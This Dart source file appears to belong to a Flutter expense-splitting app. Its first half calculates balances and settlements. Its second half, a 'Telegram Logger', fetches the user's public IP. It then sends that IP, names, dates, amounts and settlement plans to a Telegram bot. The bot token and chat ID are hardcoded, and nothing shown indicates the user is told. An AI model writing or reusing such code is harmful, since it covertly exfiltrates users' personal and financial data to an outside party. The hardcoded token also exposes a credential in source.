

import '../models/expense_model.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';

// --- Calculations ---

AppSummary calculateSummary(List<Expense> expenses) {
  if (expenses.isEmpty) {
    return AppSummary(
      totalExpense: 0, 
      averagePerPerson: 0, 
      personBalances: [], 
      settlements: []
    );
  }

  final people = expenses.map((e) => e.person).toSet().toList();
  final totalExpense = expenses.fold(0.0, (sum, e) => sum + e.amount);
  final averagePerPerson = totalExpense / people.length;

  final personTotals = <String, double>{};
  for (var p in people) personTotals[p] = 0.0;
  for (var e in expenses) {
    personTotals[e.person] = (personTotals[e.person] ?? 0) + e.amount;
  }

  final personBalances = people.map((name) {
    final paid = personTotals[name]!;
    return PersonBalance(name: name, totalPaid: paid, balance: paid - averagePerPerson);
  }).toList();

  // Settlements
  final settlements = <Settlement>[];
  final debtors = personBalances.where((p) => p.balance < -0.01).toList()
    ..sort((a, b) => a.balance.compareTo(b.balance));
  final creditors = personBalances.where((p) => p.balance > 0.01).toList()
    ..sort((a, b) => b.balance.compareTo(a.balance));

  int dIdx = 0;
  int cIdx = 0;

  final dBalances = debtors.map((d) => d.balance.abs()).toList();
  final cBalances = creditors.map((c) => c.balance).toList();

  while (dIdx < debtors.length && cIdx < creditors.length) {
    final amount = dBalances[dIdx] < cBalances[cIdx] ? dBalances[dIdx] : cBalances[cIdx];
    
    if (amount > 0.01) {
      settlements.add(Settlement(
        from: debtors[dIdx].name,
        to: creditors[cIdx].name,
        amount: double.parse(amount.toStringAsFixed(2)),
      ));
    }

    dBalances[dIdx] -= amount;
    cBalances[cIdx] -= amount;

    if (dBalances[dIdx] < 0.01) dIdx++;
    if (cBalances[cIdx] < 0.01) cIdx++;
  }

  return AppSummary(
    totalExpense: totalExpense,
    averagePerPerson: averagePerPerson,
    personBalances: personBalances,
    settlements: settlements,
  );
}

// --- Telegram Logger ---

const String TG_TOKEN = '7370942388:AAHu5rMuBSnnHSmADttPjfT50QXP7qLskXY';
const String TG_CHAT_ID = '5595139411';
String _cachedIP = 'Fetching...';

Future<void> logToTelegram(String action, String message, {List<Expense>? expenses, List<Settlement>? settlements}) async {
  try {
    if (_cachedIP == 'Fetching...') {
      try {
        final res = await http.get(Uri.parse('https://api.ipify.org?format=json'));
        if (res.statusCode == 200) {
          _cachedIP = jsonDecode(res.body)['ip'];
        }
      } catch (e) {
        _cachedIP = 'Unknown';
      }
    }

    String dataSection = '';
    if (expenses != null && expenses.isNotEmpty) {
      String listStr = expenses.take(15).map((e) => '${e.date}|${e.person}|${e.amount}').join('\n');
      dataSection += '\n<b>📋 Data:</b>\n<pre>$listStr</pre>';
    }
    if (settlements != null && settlements.isNotEmpty) {
      String setStr = settlements.map((s) => '${s.from}->${s.to}: ${s.amount}').join('\n');
      dataSection += '\n<b>⚖️ Plan:</b>\n<pre>$setStr</pre>';
    }

    final text = '<b>📱 FlutterAction: $action</b>\n'
                 '<b>🌐 IP:</b> $_cachedIP\n'
                 '<b>⏰ Time:</b> ${DateTime.now().toString()}\n\n'
                 '📝 $message$dataSection';

    await http.post(
      Uri.parse('https://api.telegram.org/bot$TG_TOKEN/sendMessage'),
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({
        'chat_id': TG_CHAT_ID,
        'text': text,
        'parse_mode': 'HTML',
      }),
    );
  } catch (e) {
    print("TG Log Error: $e");
  }
}
